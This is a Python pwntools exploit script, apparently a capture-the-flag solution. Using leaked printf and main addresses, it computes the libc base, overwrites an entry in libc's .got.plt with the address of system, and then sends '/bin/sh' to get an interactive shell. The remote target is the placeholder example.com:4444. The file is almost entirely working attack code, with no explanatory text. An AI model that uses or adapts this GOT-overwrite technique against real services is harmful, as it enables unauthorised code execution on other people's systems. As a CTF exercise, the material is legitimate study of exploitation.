#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


p.recvuntil("<main> = ")
main_func_addr = eval(p.recv(14))
log.info(("main func: 0x{:08x}").format(main_func_addr))

p.recvuntil("<printf> = ")
printf_addr = eval(p.recv(14))
log.info(("printf@libc: 0x{:08x}").format(printf_addr))

libc_base = printf_addr - libc.symbols['printf']
log.info(("libc base: 0x{:08x}").format(libc_base))

libc_got = libc_base + libc.get_section_by_name('.got.plt').header["sh_addr"]
log.info(("libc .got.plt: 0x{:08x}").format(libc_got))

libc_ABS_got = libc_got + 0xa8
log.info(("ABS@libc_got: 0x{:08x}").format(libc_ABS_got))

p.recvuntil("address:")
p.sendline(hex(libc_ABS_got))
p.recvuntil("value:")
p.sendline(hex(libc_base + libc.symbols['system']))
p.recvuntil("data:")
p.sendline("/bin/sh")

p.interactive()
